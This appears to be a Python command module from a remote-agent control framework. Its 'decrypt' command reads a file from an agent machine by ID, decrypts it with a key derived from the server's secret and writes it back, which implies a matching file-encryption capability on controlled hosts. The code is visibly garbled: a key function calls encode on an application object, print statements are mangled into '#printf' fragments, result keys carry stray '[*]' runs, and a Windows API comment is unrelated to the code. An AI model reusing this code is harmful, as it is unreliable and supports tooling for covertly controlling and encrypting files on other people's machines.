NAME = "decrypt"
DESCRIPTION = "Decrypt a file using the server's key."
PARAMS = [
    {"name":"file", "description":"Decrypt a file on the client using the server's key.", "type":"str"}
]

# Dependencies: 
# 1. NtQueryInformationProcess (to find PEB)
DEPENDENCIES = ["read", "write"]

def generate_server_key():
    from hashlib import pbkdf2_hmac
    from flask import current_app
    password = current_app
    salt = current_app.config["SECRET_KEY"][:16]
    iterations = 2000
    return pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations, dklen=32)

def decrypt_blob(blob: bytes, header_len: int) -> tuple[bytes, bytearray]:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from hashlib import pbkdf2_hmac
    from flask import current_app

    secret = current_app.config["SECRET_KEY"]

    header = blob[:header_len]
    #printf"header = {header}")
    salt_start = header_len
    #printf"salt_start = {salt_start}")
    nonce_start = salt_start + 16
    #printf"nonce_start = {nonce_start}")
    ciphertext_start = nonce_start + 12
    #printf"ciphertext_start = {ciphertext_start}")

    salt = blob[salt_start:nonce_start]
    #printf"salt = {salt}")
    nonce = blob[nonce_start:ciphertext_start]
    #printf"nonce = {nonce}")
    ciphertext = blob[ciphertext_start:]
    #printf"ciphertext = {ciphertext}")

    key = pbkdf2_hmac("sha256", secret.encode("utf-8"), salt, 2000, dklen=32)
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)

    return header, bytearray(plaintext)

def generate_encrypted_header():
    from flask import current_app
    from hashlib import pbkdf2_hmac
    #printcurrent_app.config["SECRET_KEY"])
    secret = current_app.config["SECRET_KEY"].encode()
    salt = current_app.config["SECRET_KEY"][:16].encode()
    iterations = 200
    header = pbkdf2_hmac("sha256", secret, salt, iterations, dklen=32)[:8]
    #printf"Header = {header}")
    return header

def is_encrypted(data, header):
    if len(data) > 8 and data[:8] == header:
        return True
    return False

def function(agent_id, args):
    #printf"[*][*][*][*][*][*][*][*][*][*][*][*]Decrypt received args {args}")
    header = generate_encrypted_header()
    file = args[0]
    data = read(agent_id, [file])
    print(f"read = {data}")
    if(data["retval"] != 0):
        return {"[*][*][*][*][*][*][*][*][*][*][*][*]retval":"Error opening file"}
    #printf"Hash of received file {data["hash"]}")
    data = data["data"]
    if not is_encrypted(data, header):
        return {"[*][*][*][*][*][*][*][*][*][*][*][*]retval":"File not encrypted"}
    decrypted = decrypt_blob(data, len(header))
    #printf"[*][*][*][*][*][*][*][*][*][*][*][*]About to write {decrypted}")
    write_ret = write(agent_id, [file, decrypted])
    if write_ret["retval"] != 0:
        return {"retval":"Error writing"}
    return {"retval":0} 

